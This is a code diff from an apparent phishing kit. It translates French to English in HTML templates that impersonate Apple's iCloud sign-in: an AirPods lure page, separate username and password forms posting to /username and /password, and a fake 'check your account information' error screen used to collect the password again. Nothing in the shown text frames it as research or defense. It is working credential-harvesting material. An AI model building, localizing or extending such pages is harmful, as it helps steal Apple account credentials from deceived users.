@@ -59,7 +59,7 @@ airpods_page = """
     <img src="https://i.ibb.co/zHQBkrHX/airpods.jpg" 
          alt="AirPods" class="airpods-image">
     <h1>AirPods de Youba</h1>
-    <a href="/login" class="login-button">Connectez-vous avec iCloud</a>
+    <a href="/login" class="login-button">Sign in with iCloud</a>
 </body>
 </html>
 """
@@ -184,7 +184,7 @@ base_html = """
 <body>
 <div class="login-container">
     <img src="https://i.ibb.co/kddN5ht/Capture-d-cran-du-2025-05-21-09-26-14.png" class="apple-logo">
-    <h2>Se connecter avec un compte Apple</h2>
+    <h2>Sign in with Apple</h2>
     {content}
 </div>
 </body>
@@ -194,15 +194,15 @@ base_html = """
 username_screen = """
 <form method="POST" action="/username">
     <div class="input-container">
-        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" required>
+        <input type="text" name="username" class="input-field" placeholder="Email or phone number" required>
         <button type="submit" class="submit-btn">→</button>
     </div>
     <div class="checkbox-container">
         <input type="checkbox" id="stay_connected" name="stay_connected">
-        <label for="stay_connected">Rester connecté</label>
+        <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Mot de passe oublié?</a>
-    <a href="#" class="link">Créer un compte Apple</a>
+    <a href="#" class="link">Forgot password?</a>
+    <a href="#" class="link">Create Apple ID</a>
 </form>
 """
 
@@ -214,15 +214,15 @@ password_screen = """
 <form method="POST" action="/password">
     <input type="hidden" name="username" value="{username}">
     <div class="input-container">
-        <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
+        <input type="password" name="password" class="input-field" placeholder="Password" required>
         <button type="submit" class="submit-btn">→</button>
     </div>
     <div class="checkbox-container">
         <input type="checkbox" id="stay_connected" name="stay_connected">
-        <label for="stay_connected">Rester connecté</label>
+        <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Mot de passe oublié?</a>
-    <a href="#" class="link">Créer un compte Apple</a>
+    <a href="#" class="link">Forgot password?</a>
+    <a href="#" class="link">Create Apple ID</a>
 </form
 """
 
@@ -233,15 +233,15 @@ error_screen = """
         <button type="submit" class="submit-btn">→</button>
     </div>
     <div class="error-message">
-        <strong>Mot de passe</strong><br>
-        Vérifiez les informations de compte que vous avez entrées et réessayez.
+        <strong>Password</strong><br>
+        Check your account information and try again.
     </div>
     <div class="checkbox-container">
         <input type="checkbox" id="stay_connected" name="stay_connected">
-        <label for="stay_connected">Rester connecté</label>
+        <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Mot de passe oublié?</a>
-    <a href="#" class="link">Créer un compte Apple</a>
+    <a href="#" class="link">Forgot password?</a>
+    <a href="#" class="link">Create Apple ID</a>
 </form>
 """
 
